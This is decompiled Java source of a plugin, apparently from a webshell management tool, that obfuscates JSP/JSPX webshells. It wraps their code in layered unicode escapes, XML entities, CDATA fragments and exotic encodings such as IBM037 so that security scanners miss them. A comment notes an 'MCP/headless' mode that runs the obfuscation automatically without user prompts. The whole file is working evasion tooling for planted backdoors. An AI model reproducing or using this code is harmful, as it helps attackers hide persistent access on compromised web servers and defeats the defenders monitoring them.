//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package core.shellprocessor.jspescapes;

import core.annotation.GenerateProcessor;
import core.imp.ShellProcessor;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.LinkedList;
import java.util.SplittableRandom;
import util.ByteBuffer;
import util.functions;

@GenerateProcessor(
        DisplayName = "JSP/JSPX 超级混淆",
        superTemplate = {"jsp", "jspx"}
)
public class JspEscapesProcessor implements ShellProcessor {
    private static final String[] METHODS;
    private SplittableRandom random = new SplittableRandom();
    private EscapesOptions options;

    public JspEscapesProcessor() {
    }

    public int random(int a, int b) {
        if (b >= 1 && a <= b) {
            return a == b ? a : this.random.nextInt(a, b + 1);
        } else {
            return 0;
        }
    }

    public String makeLitter(String str) {
        StringBuilder sb = new StringBuilder();
        if (this.options.isAppendLitter) {
            int num = this.random(this.options.minLitterNumber, this.options.maxLitterNumber + 1);

            for(int i = 0; i < num; ++i) {
                sb.append(str);
            }
        }

        return sb.toString();
    }

    public String escapesUnicode(String content) {
        char[] chars = content.toCharArray();
        StringBuilder builder = new StringBuilder();
        char[] var4 = chars;
        int var5 = chars.length;

        for(int var6 = 0; var6 < var5; ++var6) {
            char c = var4[var6];
            builder.append("\\u");
            builder.append(this.makeLitter("u"));
            String hx = Integer.toString(c, 16);
            if (hx.length() < 4) {
                builder.append("0000".substring(hx.length())).append(hx);
            } else {
                builder.append(hx);
            }
        }

        return builder.toString();
    }

    public String escapesDecimal(String content) {
        char[] chars = content.toCharArray();
        StringBuilder builder = new StringBuilder();
        char[] var4 = chars;
        int var5 = chars.length;

        for(int var6 = 0; var6 < var5; ++var6) {
            char c = var4[var6];
            builder.append("&#");
            builder.append(this.makeLitter("0"));
            builder.append((int) c);
            builder.append(";");
        }

        return builder.toString();
    }

    public String escapesHex(String content) {
        char[] chars = content.toCharArray();
        StringBuilder builder = new StringBuilder();
        char[] var4 = chars;
        int var5 = chars.length;

        for(int var6 = 0; var6 < var5; ++var6) {
            char c = var4[var6];
            builder.append("&#x");
            builder.append(this.makeLitter("0"));
            builder.append(Integer.toHexString(c));
            builder.append(";");
        }

        return builder.toString();
    }

    public String escapesXmlLabel(String content) {
        char[] chars = content.toCharArray();
        StringBuilder builder = new StringBuilder();
        char[] var4 = chars;
        int var5 = chars.length;

        for(int var6 = 0; var6 < var5; ++var6) {
            char c = var4[var6];
            if (c == ' ') {
                builder.append(this.escapesUnicode(String.valueOf(c)));
            } else {
                builder.append("<![CDATA[");
                builder.append(c);
                builder.append("]]>");
            }
        }

        return builder.toString();
    }

    private byte[] processor(byte[] bytes) {
        String content = new String();
        String targetStr = new String(bytes, StandardCharsets.UTF_8);
        if (this.options.isDoubleConfusion) {
            targetStr = this.escapesUnicode(targetStr);
        }

        if (this.options.isRandomConfusion) {
            try {
                char[] chars = targetStr.toCharArray();
                StringBuilder sb = new StringBuilder();
                char lastChar = 0;
                char[] var7 = chars;
                int var8 = chars.length;

                for(int var9 = 0; var9 < var8; ++var9) {
                    char c = var7[var9];
                    String methodName = METHODS[this.random.nextInt(0, METHODS.length)];
                    if (this.options.isDoubleConfusion) {
                        while("escapesUnicode".equals(methodName)) {
                            methodName = METHODS[this.random.nextInt(0, METHODS.length)];
                        }
                    }

                    if (lastChar == ' ') {
                        while("escapesXmlLabel".equals(methodName)) {
                            methodName = METHODS[this.random.nextInt(0, METHODS.length)];
                        }
                    }

                    Method method = JspEscapesProcessor.class.getMethod(methodName, String.class);
                    sb.append((String)method.invoke(this, String.valueOf(c)));
                    lastChar = c;
                }

                content = sb.toString();
            } catch (Throwable var14) {
                var14.printStackTrace();
            }
        } else {
            int escapesIndex = Arrays.binarySearch(METHODS, this.options.escapeMethod);
            if (escapesIndex >= 0) {
                try {
                    Method method2 = JspEscapesProcessor.class.getMethod(this.options.escapeMethod, String.class);
                    content = (String)method2.invoke(this, targetStr);
                } catch (Throwable var13) {
                    var13.printStackTrace();
                }
            }
        }

        return content.getBytes(StandardCharsets.UTF_8);
    }

    // MCP/headless 自动选项：设置后 doProcessor(shell, suffix) 不再弹 ChooseEscapes 对话框
    private static final ThreadLocal<EscapesOptions> AUTO_OPTIONS = new ThreadLocal<>();

    public static void setAutoOptions(EscapesOptions options) {
        AUTO_OPTIONS.set(options);
    }

    public static void clearAutoOptions() {
        AUTO_OPTIONS.remove();
    }

    public byte[] doProcessor(byte[] shell, String suffix) {
        EscapesOptions opts = AUTO_OPTIONS.get();
        if (opts == null) {
            opts = ChooseEscapes.chooseEscapes(METHODS);
        }
        return this.doProcessor(shell, suffix, opts);
    }

    public byte[] doProcessor(byte[] var1, String var2, String var3) {
        return new byte[0];
    }

    public byte[] doProcessor(byte[] shell, String suffix, EscapesOptions escapesOptions) {
        this.options = escapesOptions;
        ByteBuffer byteBuffer = new ByteBuffer(shell);
        if ("jsp".equals(suffix)) {
            int jspxLabelIndex = byteBuffer.index(0, "<%!");
            if (jspxLabelIndex < 0) {
                jspxLabelIndex = byteBuffer.index(0, "<%");
            }

            byteBuffer.append("<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"1.2\">", jspxLabelIndex);
            byteBuffer.append("</jsp:root>", byteBuffer.length());
            byteBuffer.replaceFirst("<%!", "<jsp:declaration>", jspxLabelIndex);
            byteBuffer.replaceFirst("%>", "</jsp:declaration>", jspxLabelIndex);
            byteBuffer.replaceFirst("<%", "<jsp:scriptlet>", jspxLabelIndex);
            byteBuffer.replaceFirst("%>", "</jsp:scriptlet>", jspxLabelIndex);
        }

        ByteBuffer globalCodeByteBuffer = byteBuffer.subMiddleBytes("<jsp:declaration>", "</jsp:declaration>");
        ByteBuffer codeByteBuffer = byteBuffer.subMiddleBytes("<jsp:scriptlet>", "</jsp:scriptlet>");
        ByteBuffer globalCodeNewByteBuffer = new ByteBuffer(this.processor(globalCodeByteBuffer.getBytes()));
        byteBuffer.replace(globalCodeByteBuffer.getBytes(), globalCodeNewByteBuffer.getBytes());
        ByteBuffer codeNewByteBuffer = new ByteBuffer(this.processor(codeByteBuffer.getBytes()));
        byteBuffer.replace(codeByteBuffer.getBytes(), codeNewByteBuffer.getBytes());
        if (!this.options.EncodingMethod.equals("关闭")) {
            try {
                String declaration = "<?xml version=\"1.0\" encoding=\"" + this.options.EncodingMethod + "\" ?>";
                if (!this.options.isEncodingHeader) {
                    declaration = "";
                }

                byte[] declarationBytes = declaration.getBytes("UTF-8");
                byte[] currentBytes = byteBuffer.getBytes();
                String content = new String(currentBytes, "UTF-8");
                byte[] ibm037Bytes = content.getBytes(this.options.EncodingMethod);
                byte[] combinedBytes = new byte[declarationBytes.length + ibm037Bytes.length];
                System.arraycopy(declarationBytes, 0, combinedBytes, 0, declarationBytes.length);
                System.arraycopy(ibm037Bytes, 0, combinedBytes, declarationBytes.length, ibm037Bytes.length);
                byteBuffer = new ByteBuffer(combinedBytes);
            } catch (UnsupportedEncodingException var15) {
                var15.printStackTrace();
            }
        }

        return byteBuffer.getBytes();
    }

    static {
        LinkedList<String> _METHODS = new LinkedList();
        Arrays.stream(JspEscapesProcessor.class.getMethods()).forEach((method) -> {
            Class[] paramTypes = method.getParameterTypes();
            if (String.class.isAssignableFrom(method.getReturnType()) && paramTypes.length == 1 && String.class.isAssignableFrom(paramTypes[0]) && method.getName().startsWith("escapes")) {
                _METHODS.add(method.getName());
            }

        });
        METHODS = (String[])((String[])_METHODS.toArray(new String[0]));
        Arrays.sort(METHODS);
    }

    public static String[] listEscapeMethods() {
        return METHODS.clone();
    }

    public static class EscapesOptions {
        public String escapeMethod;
        public boolean isAppendLitter;
        public int maxLitterNumber;
        public int minLitterNumber;
        public boolean isDoubleConfusion;
        public boolean isRandomConfusion;
        public boolean isIBM037;
        public String EncodingMethod;
        public boolean isEncodingHeader;

        public EscapesOptions() {
        }

        public String toString() {
            return "EscapesOptions{escapeMethod='" + this.escapeMethod + "', isAppendLitter=" + this.isAppendLitter + ", maxLitterNumber=" + this.maxLitterNumber + ", minLitterNumber=" + this.minLitterNumber + ", isDoubleConfusion=" + this.isDoubleConfusion + ", isRandomConfusion=" + this.isRandomConfusion + ", EncodingMethod=" + this.EncodingMethod + ", isEncodingHeader=" + this.isEncodingHeader + '}';
        }
    }
}
